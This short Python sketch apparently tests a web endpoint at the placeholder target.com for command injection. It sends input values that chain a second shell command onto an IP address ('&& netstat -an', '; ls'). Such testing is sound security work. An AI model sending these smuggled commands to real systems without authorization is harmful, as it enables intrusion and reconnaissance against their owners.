def test_command_injection(url, payloads):
    for payload in payloads:
        response = send_request(url, {"input": payload})
        if "unexpected_output" in response.text:
            print(f"Vulnerability found with payload: {payload}")

payloads = ["127.0.0.1 && netstat -an", "127.0.0.1; ls"]
test_command_injection("http://target.com/command_injection", payloads)